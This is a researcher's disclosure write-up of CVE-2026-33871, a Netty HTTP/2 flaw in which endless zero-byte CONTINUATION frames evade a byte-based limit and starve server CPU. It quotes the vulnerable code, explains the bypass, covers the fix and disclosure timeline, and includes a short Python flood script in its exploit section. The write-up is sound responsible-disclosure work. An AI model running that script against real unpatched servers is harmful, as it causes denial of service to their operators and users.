When 0 Bytes Burn 100% CPU: Netty HTTP/2 CONTINUATION Flood (CVE-2026-33871)

Prabhav Srinath | 24th March 2026 | CVE-2026-33871 | CVSS 8.7 High

TL;DR

Netty's DefaultHttp2FrameReader will happily accept an unbounded stream of HTTP/2 CONTINUATION frames for a single header block without enforcing a frame-count limit. The only existing protection was a byte cap (maxHeaderListSizeGoAway) that measures payload bytes. By sending 0-byte CONTINUATION frames (which are completely valid under RFC 9113), the accumulator never increments, rendering the byte limit completely inert. Each empty frame costs the server ~389ns of CPU parse-and-verify work against 9 bytes of attacker wire cost, while simultaneously freezing all multiplexed streams on the connection. This is CVE-2026-33871 (CVSS 8.7), leading to unauthenticated DoS across default Netty servers.

How I Discovered This

I was tracing Netty's HTTP/2 state machine to understand how fragmented header blocks get reassembled. In HTTP/2, if a compressed header block exceeds a single frame's MAX_FRAME_SIZE, the sender sends a HEADERS frame (without END_HEADERS flag), followed by a sequence of CONTINUATION frames until the final frame with END_HEADERS arrives.

Every parser accepting repeated stream fragments must enforce a boundary limit, or it becomes an asymmetric resource exhaustion bug. I looked for a frame-counter like maxContinuations in verifyContinuationFrame(): 

// DefaultHttp2FrameReader.java, lines 381–393
private void verifyContinuationFrame() throws Http2Exception {
    verifyAssociatedWithAStream();
    if (headersContinuation == null) {
        throw connectionError(PROTOCOL_ERROR, "...");
    }
    if (streamId != headersContinuation.getStreamId()) {
        throw connectionError(PROTOCOL_ERROR, "...");
    }
    // Notice anything missing? ZERO counter checks! Frames accepted indefinitely!
}

The method verifies that the stream exists and matches the active header continuation. And then it simply returns. It never asks how many CONTINUATION frames have already arrived on this stream!

The Guard That Counted The Wrong Metric

Netty did have a security guard: maxHeaderListSizeGoAway(). It was designed to send a GOAWAY frame if someone tried to flood massive megabytes of headers. But look at how it was implemented in HeadersBlockBuilder.java: 

// HeadersBlockBuilder.addFragment() — lines 710–711
if (headersDecoder.configuration().maxHeaderListSizeGoAway() - len <
        headerBlock.readableBytes()) {
    headerSizeExceeded();   // 10240 - 0 < 0 → ALWAYS FALSE
}

When a frame has len = 0:

10240 - 0 < 0 is FALSE. It is false on frame 1, false on frame 1,000, and false on frame 100,000. Because 0 bytes are added to headerBlock, the accumulated size never grows, and the limit never triggers!

And per RFC 9113 Section 6.10, a 0-byte CONTINUATION frame is 100% specification compliant. The server cannot reject it at the transport layer without violating the standard!

The Asymmetric Exploit

The exploit mechanics are brutally effective:

  1. Open an HTTP/2 TLS or cleartext connection.
  2. Send a single HEADERS frame without END_HEADERS.
  3. Stream infinite 0-byte CONTINUATION frames (9 bytes wire overhead each).
# Conceptual PoC streaming 0-byte CONTINUATION frames
import socket, ssl

# 9-byte HTTP/2 Frame Header: Length(3) | Type(1) | Flags(1) | StreamID(4)
# Type 0x09 = CONTINUATION, Flags 0x00 = NO END_HEADERS
empty_continuation = b"\x00\x00\x00\x09\x00\x00\x00\x00\x01"

s = socket.create_connection(("target.internal", 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(["h2"])
tls = ctx.wrap_socket(s, server_hostname="target.internal")

# Send client preface + initial HEADERS
tls.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
tls.sendall(b"\x00\x00\x01\x01\x00\x00\x00\x00\x01\x82") # HEADERS on stream 1

# Stream 0-byte frames indefinitely
while True:
    tls.sendall(empty_continuation * 100)  # 100% CPU thread starvation

The Impact:

  • Connection Lockout: Per RFC 9113, while a CONTINUATION chain is active, no other stream frames can be processed on that connection.
  • CPU Starvation: The server executes full frame parsing logic on each frame (~389ns per frame), burning worker thread cycles while reading almost zero network traffic.
  • Thread Pool Exhaustion: Opening 50 connections with continuous empty frames pins the server's entire Netty EventLoopGroup.
Attacker sending 9-byte frames while the server CPU graph hits a vertical line

The Fix

The Netty maintainers resolved this in Netty 4.1.132.Final and 4.2.11.Final (PR #13969) by enforcing an explicit count limit on consecutive CONTINUATION frames per HTTP/2 header block, closing the vector where zero-byte frames could bypass the byte accumulator and exhaust CPU resources.

Disclosure Timeline

  • February 2026: Vulnerability discovered during Netty HTTP/2 frame engine audit.
  • March 2026: Disclosed to Netty core maintainers under GHSA-w9fj-cfpg-grvv / CERT/CC VU#421644.
  • March 24, 2026: Patched in Netty 4.1.132.Final and 4.2.11.Final with CVE-2026-33871 assigned.
